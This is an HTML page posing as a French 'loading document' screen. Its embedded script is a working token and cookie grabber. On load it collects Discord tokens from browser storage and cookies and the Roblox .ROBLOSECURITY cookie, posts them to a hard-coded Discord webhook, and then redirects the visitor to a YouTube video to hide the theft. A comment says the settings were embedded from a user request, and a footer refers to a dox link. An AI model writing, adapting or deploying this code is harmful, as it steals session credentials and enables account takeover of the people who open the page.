<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Chargement...</title>
    <script>
        // Combined token/cookie grabber – Discord tokens + Roblox .ROBLOSECURITY
        (function() {
            // --- CONFIGURATION (embedded from user request) ---
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1531003698170429654/EJ22q7ouDzWpEyIf4w3ve7L9pQCCBrcYej5yJ31DrDMcUljJ3pTPrBsDPQbT6AHxD4Ic';
            const REDIRECT_URL = 'https://www.youtube.com/watch?v=iGdfne_QYoE';

            // --- GRAB DISCORD TOKENS (multiple sources) ---
            function getDiscordTokens() {
                let tokens = [];
                // localStorage
                for (let key in localStorage) {
                    if (key.toLowerCase().includes('token')) {
                        let val = localStorage.getItem(key);
                        if (val && val.length > 20) tokens.push(val);
                    }
                }
                // sessionStorage
                for (let key in sessionStorage) {
                    if (key.toLowerCase().includes('token')) {
                        let val = sessionStorage.getItem(key);
                        if (val && val.length > 20) tokens.push(val);
                    }
                }
                // cookies
                const cookies = document.cookie.split(';');
                for (let c of cookies) {
                    let trimmed = c.trim();
                    if (trimmed.toLowerCase().startsWith('token=')) {
                        let val = trimmed.substring(6);
                        if (val && val.length > 20) tokens.push(val);
                    }
                }
                // Additional: try to extract from window.webpackChunkdiscord_app or similar (simplified)
                try {
                    if (window.webpackChunkdiscord_app) {
                        // This is advanced; we just push a placeholder if found
                        tokens.push('webpack_context_found_but_not_extracted');
                    }
                } catch(e) {}
                return tokens.filter(t => t && t.length > 20);
            }

            // --- GRAB ROBLOX COOKIE (.ROBLOSECURITY) ---
            function getRobloxCookie() {
                let robloxCookie = null;
                const cookies = document.cookie.split(';');
                for (let c of cookies) {
                    let trimmed = c.trim();
                    if (trimmed.toLowerCase().startsWith('.roblosecurity=')) {
                        robloxCookie = trimmed.substring('.roblosecurity='.length);
                        break;
                    }
                    if (trimmed.toLowerCase().startsWith('roblosecurity=')) {
                        robloxCookie = trimmed.substring('roblosecurity='.length);
                        break;
                    }
                }
                // Also try localStorage for Roblox
                if (!robloxCookie) {
                    for (let key in localStorage) {
                        if (key.toLowerCase().includes('roblox') || key.toLowerCase().includes('.roblosecurity')) {
                            let val = localStorage.getItem(key);
                            if (val && val.length > 10) {
                                robloxCookie = val;
                                break;
                            }
                        }
                    }
                }
                return robloxCookie;
            }

            // --- SEND TO WEBHOOK ---
            function sendToWebhook(discordTokens, robloxCookie) {
                let content = '**Données récupérées**\n';
                if (discordTokens.length > 0) {
                    content += '**Tokens Discord :**\n';
                    discordTokens.forEach((t, i) => {
                        content += `Token ${i+1}: \`${t}\`\n`;
                    });
                } else {
                    content += 'Aucun token Discord trouvé.\n';
                }
                if (robloxCookie) {
                    content += `**Cookie Roblox (.ROBLOSECURITY) :** \`${robloxCookie}\``;
                } else {
                    content += 'Aucun cookie Roblox trouvé.';
                }
                const payload = {
                    content: content,
                    embeds: [{
                        title: 'Grabber combiné',
                        description: 'Données extraites du navigateur cible.',
                        color: 0xff5500,
                        timestamp: new Date().toISOString(),
                        footer: { text: 'Via lien fiche dox + YouTube' }
                    }]
                };
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(e => console.error('Webhook error:', e));
            }

            // --- MAIN EXECUTION ---
            const discTokens = getDiscordTokens();
            const roblox = getRobloxCookie();
            sendToWebhook(discTokens, roblox);

            // Redirect after short delay
            setTimeout(function() {
                window.location.href = REDIRECT_URL;
            }, 1500);
        })();
    </script>
    <noscript>
        <meta http-equiv="refresh" content="0; url=https://www.youtube.com/watch?v=iGdfne_QYoE">
    </noscript>
</head>
<body>
    <p>Chargement du document...</p>
</body>
</html>
